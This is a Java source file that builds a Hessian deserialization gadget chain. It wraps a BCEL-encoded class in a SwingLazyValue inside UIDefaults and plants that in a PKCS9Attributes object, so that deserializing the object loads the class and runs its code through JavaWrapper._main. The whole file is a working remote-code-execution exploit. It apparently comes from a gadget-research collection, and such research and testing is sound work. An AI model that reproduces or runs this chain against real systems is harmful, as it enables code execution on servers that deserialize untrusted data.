package com.test.gadget.toStringBased;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassPath;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;
import tools.HessianTools;
import tools.ReflectTools;
import tools.UnsafeTools;

import javax.swing.*;
import java.io.IOException;

public class PKCS9_BCEL {
    public static void main(String[] args) throws Exception {
        Object payload = getPayload();
        byte[] bytes = HessianTools.hessian2ToStringSer(payload);
        HessianTools.hessianDeser(bytes, "2");
    }

    public static Object getPayload() throws Exception {
        JavaClass javaClass = Repository.lookupClass(BCELClass.class);
        String bcel = "$$BCEL$$" + Utility.encode(javaClass.getBytes(), true);

        SwingLazyValue swingLazyValue = new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{bcel}});

        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, swingLazyValue);

        Object PKCS9s = UnsafeTools.getObjectByUnsafe(PKCS9Attributes.class);
        ReflectTools.setFieldValue(PKCS9s, "attributes", uiDefaults);

        return PKCS9s;
    }
}
